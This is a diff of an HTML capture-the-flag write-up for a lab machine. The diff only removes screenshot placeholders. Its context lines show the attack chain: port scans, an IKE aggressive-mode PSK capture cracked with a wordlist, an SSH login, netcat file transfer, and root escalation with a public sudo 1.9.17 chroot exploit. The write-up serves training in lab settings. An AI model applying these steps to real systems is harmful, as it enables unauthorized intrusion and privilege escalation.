@@ -339,11 +339,6 @@
     <p><strong>Notable output:</strong></p>
     <pre><code>22/tcp open ssh OpenSSH 10.0p2 Debian 8</code></pre>
     <p>Only SSH initially visible.</p>
-    <div class="shot">
-        <img src="expressway_01.png" alt="nmap TCP scan showing only SSH open"
-             onerror="this.onerror=null;this.style.display='none';this.nextElementSibling.style.display='block'">
-        <div class="img-placeholder" style="display:none">&#128247; Save screenshot here as <code>expressway_01.png</code><br>nmap TCP scan showing only SSH open</div>
-    </div>
     <h3>UDP discovery</h3>
     <p>Further UDP scanning revealed several services:</p>
     <ul>
@@ -353,11 +348,6 @@
         <li>UDP 68 — DHCP client port (filtered)</li>
     </ul>
     <pre><code>sudo nmap -sU 10.129.55.71</code></pre>
-    <div class="shot">
-        <img src="expressway_02.png" alt="UDP scan revealing IKE/ISAKMP on 500"
-             onerror="this.onerror=null;this.style.display='none';this.nextElementSibling.style.display='block'">
-        <div class="img-placeholder" style="display:none">&#128247; Save screenshot here as <code>expressway_02.png</code><br>UDP scan revealing IKE/ISAKMP on 500</div>
-    </div>
     <h2>IKE / IPsec enumeration &amp; PSK recovery</h2>
     <h3>Fingerprint &amp; aggressive mode capture</h3>
     <p>Used <code>ike-scan</code> to probe the gateway and check for Aggressive Mode support:</p>
@@ -373,11 +363,6 @@ psk-crack -d /usr/share/wordlists/rockyou.txt psk_params.txt
 key "freakingrockstarontheroad" matches SHA1 hash ...</code></pre>
     <div class="success">
     <p><strong>Recovered PSK:</strong> freakingrockstarontheroad</p>
-    </div>
-    <div class="shot">
-        <img src="expressway_03.png" alt="psk-crack recovering the pre-shared key"
-             onerror="this.onerror=null;this.style.display='none';this.nextElementSibling.style.display='block'">
-        <div class="img-placeholder" style="display:none">&#128247; Save screenshot here as <code>expressway_03.png</code><br>psk-crack recovering the pre-shared key</div>
     </div>
     <h2>Internal access — SSH to host</h2>
     <p>The IKE Aggressive-mode handshake revealed an identity (<code>ID_USER_FQDN</code>) for the account <code>ike@expressway</code>. Using the recovered credentials, a direct SSH login was performed with the <code>ike</code> user and the recovered password:</p>
@@ -396,11 +381,6 @@ Sudoers policy plugin version 1.9.17
 /usr/local/bin/sudo
 -rwsr-xr-x 1 root root ... /usr/local/bin/sudo</code></pre>
     <p>The installed sudo version 1.9.17 is known to be vulnerable (fixed in a subsequent patch release). This pointed to a public exploit for the 2025 CVE chain, notably CVE-2025-32462 / CVE-2025-32463 (<code>--chroot</code> related issues).</p>
-    <div class="shot">
-        <img src="expressway_04.png" alt="sudo -V output showing version 1.9.17"
-             onerror="this.onerror=null;this.style.display='none';this.nextElementSibling.style.display='block'">
-        <div class="img-placeholder" style="display:none">&#128247; Save screenshot here as <code>expressway_04.png</code><br>sudo -V output showing version 1.9.17</div>
-    </div>
     <h2>Privilege escalation — exploit sudo 1.9.17</h2>
     <div class="highlight">
     <p><strong>Exploit used:</strong> <code>https://github.com/KaiHT-Ladiant/CVE-2025-32463</code></p>
@@ -419,11 +399,6 @@ cat /root/root.txt</code></pre>
     <p>Note: I built the exploit on my own machine locally and transferred the file using NetCat.</p>
     <pre><code>nc -lvp 8080 &gt; cve.sh          # Target machine
 nc 10.129.55.71 8080 &lt; cve.sh  # Host machine</code></pre>
-    </div>
-    <div class="shot">
-        <img src="expressway_05.png" alt="Root shell spawned by the sudo 1.9.17 PoC + root flag"
-             onerror="this.onerror=null;this.style.display='none';this.nextElementSibling.style.display='block'">
-        <div class="img-placeholder" style="display:none">&#128247; Save screenshot here as <code>expressway_05.png</code><br>Root shell spawned by the sudo 1.9.17 PoC + root flag</div>
     </div>
     <h3>Result</h3>
     <p>Running the KaiHT-Ladiant PoC spawned a root shell on the host. The root flag was read from <code>/root/root.txt</code>.</p>
